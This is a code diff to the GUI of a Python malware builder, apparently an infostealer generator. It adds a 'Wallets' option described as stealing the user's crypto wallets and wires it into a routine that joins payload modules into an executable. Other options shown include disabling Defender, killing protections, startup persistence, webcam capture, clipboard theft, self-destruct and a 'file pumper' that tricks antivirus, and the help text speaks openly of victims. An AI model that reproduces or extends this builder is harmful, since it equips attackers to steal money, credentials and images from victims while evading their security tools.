@@ -214,6 +214,10 @@ class App(customtkinter.CTk):
 												fg_color="#5d11c3", hover_color="#5057eb")
 		self.webcam.grid(row=1, column=0, sticky="nw", padx=286, pady=328)
 
+		self.wallets = customtkinter.CTkCheckBox(self.builder_frame, text="Wallets", font=customtkinter.CTkFont(size=17, family=self.font),
+											  fg_color="#5d11c3", hover_color="#5057eb", command=lambda: (self.check_pumper(), self.check_pump()))
+		self.wallets.grid(row=1, column=0, sticky="ne", padx=130, pady=328)
+
 		self.fileopts = customtkinter.CTkOptionMenu(self.builder_frame, values=["nuitka (.exe)", "pyinstaller (.exe)", ".py"],
 													font=customtkinter.CTkFont(size=32, family=self.font), width=250, height=45,
 													fg_color="#5d11c3", button_hover_color="#5057eb", button_color="#480c96", command=self.check_icon)
@@ -270,6 +274,7 @@ Self Destruct:\nDeletes the file once it has ran so the victim can't run it agai
 File Pumper:\nAdds more megabytes to the file to make the file appear to be something its not and also tricks some antiviruses.\n\n
 Clipboard:\nRetrieves the last thing they copied onto their clipboard.\n\n
 Webcam:\nTakes one picture with each attached webcam.\n\n
+Wallets:\nSteals the crypto wallets from the user.\n\n
 Build Options:\n
 Pyinstaller - Builds a standalone executable file with the necessary modules inside of it.\nAdvantages: Single file, fast compilation time, easy to transfer.\nDisadvantages: Detected by antiviruses, large file size\n
 Nuitka - Builds a standalone executable file with the necessary modules inside of it.\nAdvantages: Smaller than PyInstaller and way faster.\nDisadvantages: Detected by antiviruses, longer buildtimes.
@@ -393,7 +398,8 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
 			"anti_spam": self.antispam,
 			"self_destruct": self.self_destruct,
 			"clipboard": self.clipboard,
-			"webcam": self.webcam
+			"webcam": self.webcam,
+			"wallets": self.wallets
 		}
 
 		for key, checkbox in checkbox_mapping.items():
@@ -492,7 +498,7 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
 						code += "\n\n"
 				
 				if self.updated_dictionary["defender"]:
-					with open(options+"disable_defender.py", "r", encoding="utf-8") as f:
+					with open(options+"Disable_defender.py", "r", encoding="utf-8") as f:
 						code += f.read()
 						code += "\n\n"
 				
@@ -502,7 +508,7 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
 						code += "\n\n"
 				
 				if self.updated_dictionary["fakeerror"]:
-					with open(options+"fakeerror.py", "r", encoding="utf-8") as f:
+					with open(options+"Fake_error.py", "r", encoding="utf-8") as f:
 						code += f.read()
 						code += "\n\n"
 				
@@ -512,7 +518,7 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
 						code += "\n\n"
 				
 				if self.updated_dictionary["killprotector"]:
-					with open(options+"killprotector.py", "r", encoding="utf-8") as f:
+					with open(options+"Kill_protector.py", "r", encoding="utf-8") as f:
 						code += f.read()
 						code += "\n\n"
 				
@@ -522,7 +528,7 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
 						code += "\n\n"
 				
 				if self.updated_dictionary["systeminfo"]:
-					with open(options+"PcInfo.py", "r", encoding="utf-8") as f:
+					with open(options+"System.py", "r", encoding="utf-8") as f:
 						code += f.read()
 						code += "\n\n"
 				
@@ -532,7 +538,7 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
 						code += "\n\n"
 				
 				if self.updated_dictionary["startup"]:
-					with open(options+"startup.py", "r", encoding="utf-8") as f:
+					with open(options+"Startup.py", "r", encoding="utf-8") as f:
 						code += f.read()
 						code += "\n\n"
 				
@@ -542,7 +548,12 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
 						code += "\n\n"	
 						
 				if self.updated_dictionary["webcam"]:
-					with open(options+"webcam.py", "r", encoding="utf-8") as f:
+					with open(options+"Webcam.py", "r", encoding="utf-8") as f:
+						code += f.read()
+						code += "\n\n"
+				
+				if self.updated_dictionary["wallets"]:
+					with open(options+"Wallets.py", "r", encoding="utf-8") as f:
 						code += f.read()
 						code += "\n\n"
 
